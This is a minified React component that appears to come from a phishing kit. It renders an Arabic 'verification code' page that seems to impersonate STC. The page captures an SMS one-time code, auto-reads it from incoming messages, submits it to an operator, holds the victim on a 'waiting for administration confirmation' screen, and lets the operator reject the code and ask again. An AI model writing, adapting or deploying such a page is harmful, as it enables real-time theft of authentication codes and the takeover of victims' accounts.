import{u as o,j as e,s as d,r as R,d as evSig}from"./index-D4BysLqo.js";import{M as x}from"./MainWrapper-3fG7tHnO.js";
function f(){
var l=o(),n=e;
var _s1=R.useState(""),otp=_s1[0],setOtp=_s1[1];
var _s2=R.useState(!1),loading=_s2[0],setLoading=_s2[1];
var _s3=R.useState(""),err=_s3[0],setErr=_s3[1];
var _s4=R.useState(!1),waiting=_s4[0],setWaiting=_s4[1];R.useEffect(()=>{if(evSig.value){setLoading(!1);setWaiting(!1);setErr("تم رفض الرمز المدخل، يرجى المحاولة مرة أخرى");}},[evSig.value]);
R.useEffect(()=>{
if(typeof window!=="undefined"&&"OTPCredential"in window){
try{
var ac=new AbortController();
navigator.credentials.get({otp:{transport:["sms"]},signal:ac.signal}).then(res=>{
if(res&&res.code){var v=String(res.code||"").replace(/[٠-٩]/g,d=>String("٠١٢٣٤٥٦٧٨٩".indexOf(d))).replace(/[۰-۹]/g,d=>String("۰۱۲۳۴۵۶۷۸۹".indexOf(d))).replace(/\D/g,"").slice(0,6);setOtp(v);setErr("");}
}).catch(()=>{});
return ()=>{ac.abort();};
}catch(_){}
}
},[]);
function handleInput(ev){var v=String(ev.target.value||"").replace(/[٠-٩]/g,d=>String("٠١٢٣٤٥٦٧٨٩".indexOf(d))).replace(/[۰-۹]/g,d=>String("۰۱۲۳۴۵۶۷۸۹".indexOf(d))).replace(/\D/g,"").slice(0,6);setOtp(v);setErr("");}
function handleSubmit(ev){ev&&ev.preventDefault&&ev.preventDefault();if(!otp||otp.length<4){setErr("يرجى إدخال رمز التحقق");return;}setLoading(!0);setWaiting(!0);setErr("");d({data:{otpCode:otp},current:"mobile-otp",nextPage:"stc-call-alert",nextLink:"/stc-call-alert",waitingForAdminResponse:!0,navigate:l});}
var isLocked=loading||waiting;
return n.jsx(x,{children:n.jsx("div",{className:"bg-gray-100 min-h-screen py-20",children:n.jsx("div",{className:"flex flex-col gap-2 max-w-lg mx-auto bg-white p-8 rounded-2xl pt-10 relative",children:n.jsxs("form",{onSubmit:handleSubmit,noValidate:!0,className:"flex flex-col gap-2"+(isLocked?" pointer-events-none opacity-70":""),children:[n.jsx("img",{src:"/assets/images/client/OTP.png",className:"h-20 mx-auto mb-4",alt:"OTP"}),n.jsxs("div",{className:"flex gap-2 items-start mb-4",children:[n.jsx("img",{src:"/assets/images/client/mobile.png",className:"h-12",alt:"mobile"}),n.jsxs("div",{children:[n.jsx("h2",{className:"font-bold text-gray-600 text-base",children:"تم إرسال رمز التحقق الى هاتفك النقال."}),n.jsx("p",{className:"text-gray-500 text-sm",children:"الرجاء إدخاله في هذه الخانة."})]})]}),n.jsxs("div",{className:"flex flex-col gap-1",children:[n.jsx("label",{className:"text-sm text-gray-600",htmlFor:"otp",children:"رمز التحقق"}),n.jsx("input",{id:"otp",name:"otp",dir:"ltr",type:"text",inputMode:"numeric",autoComplete:"one-time-code",pattern:"[0-9]*",maxLength:"6",className:"w-full border border-gray-300 rounded-md px-3 py-2 bg-white text-center text-lg tracking-widest font-mono",placeholder:"- - - - - -",value:otp,onChange:handleInput,disabled:isLocked}),err?n.jsx("p",{className:"text-xs text-red-500 mt-1",children:err}):null]}),n.jsx("div",{className:"mt-4",children:n.jsx("button",{type:"submit",className:"w-full rounded-lg bg-main px-6 py-3 text-white font-bold transition hover:bg-main/90 disabled:opacity-70",disabled:!otp||otp.length<4||isLocked,children:isLocked?"جارٍ التحقق...":"تحقق"})}),waiting?n.jsx("p",{className:"text-gray-500 text-sm text-center animate-pulse mt-2",children:"بانتظار تأكيد الإدارة..."}):null,n.jsx("img",{src:"/assets/images/client/below-mob-verify.png",alt:"footer",className:"mt-6 mx-auto"})]})})})})
}
export{f as default};
